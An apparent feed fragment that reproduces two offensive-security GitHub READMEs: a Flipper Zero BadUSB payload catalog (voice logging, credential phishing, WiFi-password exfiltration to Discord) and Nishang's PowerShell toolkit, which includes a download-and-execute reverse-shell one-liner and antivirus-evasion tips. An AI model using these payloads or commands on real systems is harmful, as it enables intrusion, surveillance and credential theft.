&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#Description&quot;&gt;Description&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#The-Payloads&quot;&gt;The Payloads&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#Contact&quot;&gt;Contact&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#Acknowledgments&quot;&gt;Acknowledgments&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;Unleash the power of your Flipper 🤓💻&lt;/h1&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Description&lt;/h2&gt; 
&lt;p&gt;🥇 I am in 1st place for most payloads submitted to Hak5❗&lt;/p&gt; 
&lt;p&gt;🔓 I have taken my colllection of payloads and formatted them to work for the Flipper for all of you to use❗&lt;/p&gt; 
&lt;p&gt;⚠️ Please ENJOY and use RESPONSIBLY❗&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/hak5-banner.png&quot; alt=&quot;hak 5&quot; /&gt;&lt;/p&gt; 
&lt;h2&gt;The Payloads&lt;/h2&gt; 
&lt;p&gt;This repository has been optimized to facilitate plug and play functionality.&lt;/p&gt; 
&lt;p&gt;I purchased the domain &lt;code&gt;jakoby.lol&lt;/code&gt; for the sole purpose of creating my own short URLs.&lt;/p&gt; 
&lt;p&gt;I did this with the intention of making room for Discord webhooks and Dropbox tokens to fit in my one-liners.&lt;/p&gt; 
&lt;p&gt;This, in turn, makes it so the user no longer needs to host their own version of the script.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align=&quot;left&quot;&gt;Payloads&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Description&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Plug&#39;n&#39;Play&lt;/th&gt; 
   &lt;th align=&quot;left&quot;&gt;Author&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/VoiceLogger&quot;&gt;VoiceLogger&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Activates your target&#39;s microphone, converts their speech to text, and exfils it to Discord.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-EvilGoose&quot;&gt;Evil-Goose&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;A payload that hires a goose to hack your target in real time.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-ADV-Recon&quot;&gt;ADV-Recon&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;A script used to do an advanced level of recon on the target&#39;s computer.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-AcidBurn&quot;&gt;AcidBurn&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;A script I put together to be used on your friends or foes. Prepare to be roasted.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-JumpScare&quot;&gt;Jump-Scare&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Just a little jumpscare that changes the target&#39;s wallpaper.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-JumpScare-2.0&quot;&gt;Jump-Scare V2&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Just a little jumpscare that plays a video in the target&#39;s PowerShell console.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-ADV-RickRoll&quot;&gt;ADV-RickRoll&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;RickRoll that plays in the PowerShell console after a mouse movement is detected.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-PineApple&quot;&gt;PineApple&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Connect a target&#39;s PC to your WiFi PineApple.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;⛔&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Play-WAV&quot;&gt;Play-WAV&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Download a WAV file and play it after a mouse movement is detected.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Rage-PopUps&quot;&gt;Rage-Pop-Ups&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Generates an infinite loop of insulting pop-ups.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;⛔&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Subscribe&quot;&gt;Subscribe&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Used to make your target subscribe to your YouTube channel.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-MustSub&quot;&gt;Must Sub&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;A script used to make your target subscribe to 15 of Jakoby&#39;s favorite YouTube channels.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-PS-Draw&quot;&gt;PS-Draw&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;A script used to generate and draw images in the PowerShell window.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;⛔&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Wallpaper-Troll&quot;&gt;WallPaper-Troll&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Collects sensitive info from your target and displays it as their wallpaper to taunt them.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-WallPaper-URL&quot;&gt;WallPaper-URL&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Sets the target&#39;s wallpaper to an image you provide via a URL after a mouse movement is detected.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-We-Found-You&quot;&gt;We-Found-You&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Opens a map with your target&#39;s current location on it.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-YT-Tripwire&quot;&gt;YT-Tripwire&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Opens any YouTube video after a mouse movement is detected.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Credz-Plz&quot;&gt;Credz-Plz&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;A script used to prompt the target to enter their credentials to later be exfiltrated.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-ShortcutJacker&quot;&gt;Shortcut Jacker&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;A script used to embed malware in the shortcut on your target&#39;s desktop.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;⛔&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-WifiGrabber&quot;&gt;Wifi Grabber&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Grabs your target&#39;s WiFi passwords and uploads them to either Dropbox, Discord, or both.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-IP-Grabber&quot;&gt;IP Grabber&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Grabs your target&#39;s IP addresses and uploads them to either Dropbox, Discord, or both.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-BrowserData&quot;&gt;Browser Data&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;This payload can be used to retrieve the browsing history and bookmarks of your target.&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;✅&lt;/td&gt; 
   &lt;td align=&quot;left&quot;&gt;Jakoby&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;!-- CONTACT --&gt; 
&lt;h2&gt;Contact&lt;/h2&gt; 
&lt;h2 align=&quot;center&quot;&gt;📱 My Socials 📱&lt;/h2&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;table&gt; 
  &lt;tbody&gt;
   &lt;tr&gt; 
    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://youtube.com/c/IamJakoby?sub_confirmation=1&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/youtube-svgrepo-com.svg?sanitize=true&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;C#&quot; /&gt; &lt;/a&gt; &lt;br /&gt;YouTube &lt;/td&gt; 
    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://twitter.com/I_Am_Jakoby&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/twitter.png&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;Python&quot; /&gt; &lt;/a&gt; &lt;br /&gt;Twitter &lt;/td&gt; 
    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://www.instagram.com/i_am_jakoby/&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/insta.png&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;Golang&quot; /&gt; &lt;/a&gt; &lt;br /&gt;Instagram &lt;/td&gt; 
    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://discord.gg/MYYER2ZcJF&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/discord-v2-svgrepo-com.svg?sanitize=true&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;Jsonnet&quot; /&gt; &lt;/a&gt; &lt;br /&gt;Discord &lt;/td&gt; 
    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://www.tiktok.com/@i_am_jakoby?lang=en&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg?sanitize=true&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;Jsonnet&quot; /&gt; &lt;/a&gt; &lt;br /&gt;TikTok &lt;/td&gt; 
   &lt;/tr&gt; 
  &lt;/tbody&gt;
 &lt;/table&gt; 
&lt;/div&gt; 
&lt;!-- ACKNOWLEDGMENTS --&gt; 
&lt;h2&gt;Acknowledgments&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://hak5.org/&quot;&gt;Hak5&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/hak5darren&quot;&gt;Darren&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/UberGuidoZ&quot;&gt;UberGuidoZ&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p align=&quot;right&quot;&gt;(&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#top&quot;&gt;back to top&lt;/a&gt;)&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>samratashok/nishang</title>
      <link>https://github.com/samratashok/nishang</link>
      <description>&lt;p&gt;Nishang - Offensive PowerShell for red team, penetration testing and offensive security.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Nishang&lt;/h1&gt; 
&lt;h3&gt;Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.&lt;/h3&gt; 
&lt;p&gt;By &lt;a href=&quot;https://twitter.com/nikhil_mitt&quot;&gt;Nikhil Mittal&lt;/a&gt; Founder of &lt;a href=&quot;https://www.alteredsecurity.com/&quot;&gt;Altered Security - Hands-on red team and enterprise security training!&lt;/a&gt;&lt;/p&gt; 
&lt;h4&gt;Usage&lt;/h4&gt; 
&lt;p&gt;Import all the scripts in the current PowerShell session (PowerShell v3 onwards).&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; Import-Module .\nishang.psm1
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Use the individual scripts with dot sourcing.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . C:\nishang\Gather\Get-Information.ps1

PS C:\nishang&amp;gt; Get-Information
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To get help about any script or function, use:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; Get-Help [scriptname] -full
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.&lt;/p&gt; 
&lt;p&gt;For example, to see the help about Get-WLAN-Keys.ps1, use&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . C:\nishang\Get-WLAN-Keys.ps1

PS C:\nishang&amp;gt; Get-Help Get-WLAN-Keys -Full
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Anti Virus&lt;/h4&gt; 
&lt;p&gt;Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:&lt;/p&gt; 
&lt;p&gt;Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://&amp;lt;yourwebserver&amp;gt;/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Method 2. Use the &lt;code&gt;-encodedcommand&lt;/code&gt; (or &lt;code&gt;-e&lt;/code&gt;) parameter of PowerShell All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) &lt;code&gt;&quot;Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]&quot;&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;Encode the scrript using Invoke-Encode from Nishang:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . \nishang\Utility\Invoke-Encode

PS C:\nishang&amp;gt; Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Encoded data written to .\encoded.txt&lt;/p&gt; 
&lt;p&gt;Encoded command written to .\encodedcommand.txt&lt;/p&gt; 
&lt;p&gt;From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:\Users\target&amp;gt; powershell -e [encodedscript]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;If the scripts still get detected changing the function and parameter names and removing the help content will help.&lt;/p&gt; 
&lt;p&gt;In case Windows 10&#39;s AMSI is still blocking script execution, see this blog: &lt;a href=&quot;http://www.labofapenetrationtester.com/2016/09/amsi.html&quot;&gt;http://www.labofapenetrationtester.com/2016/09/amsi.html&lt;/a&gt;&lt;/p&gt; 
&lt;h4&gt;Scripts&lt;/h4&gt; 
&lt;p&gt;Nishang currently contains the following scripts and payloads.&lt;/p&gt; 
&lt;h4&gt;ActiveDirectory&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/ActiveDirectory/Set-DCShadowPermissions.ps1&quot;&gt;Set-DCShadowPermissions&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Modify AD objects to provide minimal permissions required for DCShadow.&lt;/p&gt; 
&lt;h4&gt;Antak - the Webshell&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/tree/master/Antak-WebShell&quot;&gt;Antak&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell.&lt;/p&gt; 
&lt;h4&gt;Backdoors&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/HTTP-Backdoor.ps1&quot;&gt;HTTP-Backdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/DNS_TXT_Pwnage.ps1&quot;&gt;DNS_TXT_Pwnage&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Execute-OnTime.ps1&quot;&gt;Execute-OnTime&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can execute PowerShell scripts at a given time on a target.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Gupt-Backdoor.ps1&quot;&gt;Gupt-Backdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Add-ScrnSaveBackdoor.ps1&quot;&gt;Add-ScrnSaveBackdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can use Windows screen saver for remote command and script execution.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Invoke-ADSBackdoor.ps1&quot;&gt;Invoke-ADSBackdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which can use alternate data streams and Windows Registry to achieve persistence.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Add-RegBackdoor.ps1&quot;&gt;Add-RegBackdoor&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U).&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Set-RemoteWMI.ps1&quot;&gt;Set-RemoteWMI&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Set-RemotePSRemoting.ps1&quot;&gt;Set-RemotePSRemoting&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Modify permissions of PowerShell remoting to allow access to a non-admin user.&lt;/p&gt; 
&lt;h4&gt;Bypass&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Bypass/Invoke-AmsiBypass.ps1&quot;&gt;Invoke-AmsiBypass&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Implementation of publicly known methods to bypass/avoid AMSI.&lt;/p&gt; 
&lt;h4&gt;Client&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-CHM.ps1&quot;&gt;Out-CHM&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create infected CHM files which can execute PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Word.ps1&quot;&gt;Out-Word&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create Word files and infect existing ones to run PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Excel.ps1&quot;&gt;Out-Excel&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create Excel files and infect existing ones to run PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-HTA.ps1&quot;&gt;Out-HTA&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create a HTA file which can be deployed on a web server and used in phishing campaigns.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Java.ps1&quot;&gt;Out-Java&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create signed JAR files which can be used with applets for script and command execution.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Shortcut.ps1&quot;&gt;Out-Shortcut&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create shortcut files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-WebQuery.ps1&quot;&gt;Out-WebQuery&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create IQY files for phishing credentials and SMB hashes.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-JS.ps1&quot;&gt;Out-JS&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create JS files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-SCT.ps1&quot;&gt;Out-SCT&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create SCT files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-SCF.ps1&quot;&gt;Out-SCF&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Create a SCF file which can be used for capturing NTLM hash challenges.&lt;/p&gt; 
&lt;h4&gt;Escalation&lt;/h4&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Enable-DuplicateToken.ps1&quot;&gt;Enable-DuplicateToken&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;When SYSTEM privileges are required.&lt;/p&gt; 
